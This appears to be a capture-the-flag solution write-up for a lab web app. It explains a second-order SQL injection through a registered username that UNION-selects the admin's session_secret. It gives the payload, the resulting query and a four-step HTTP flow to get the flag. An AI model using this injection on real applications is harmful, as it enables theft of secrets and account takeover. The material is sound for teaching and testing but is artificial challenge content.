Register a **username** that is itself the injection. It has to (a) close the
string literal the sink opens, (b) add a `UNION SELECT` with two columns to match
`SELECT code, invited_email`, and (c) comment out the trailing quote the sink
appends. The secret you want is `session_secret` in the `accounts` table, for the
row where `username='admin'`.

Payload shape:

```
x' UNION SELECT session_secret, NULL FROM accounts WHERE username='admin'-- -
```

After it is spliced in, the executed query is:

```sql
SELECT code, invited_email FROM referrals
WHERE owner = 'x' UNION SELECT session_secret, NULL FROM accounts WHERE username='admin'-- -'
```

`owner = 'x'` matches no rows, the `UNION` appends one row whose first column is
the admin `session_secret`, and `-- -` kills the dangling quote.

Full flow:

1. `POST /register` with that string as `username` (any password).
2. `POST /login` with the same credentials — you now have a session.
3. `GET /me/referrals` — the 32-hex secret appears where a referral code would be.
4. `GET /solve?secret=<that value>` — read the flag.

`tests/exploit.py` is the reference implementation of these four steps using only
`urllib` and `http.cookiejar`.
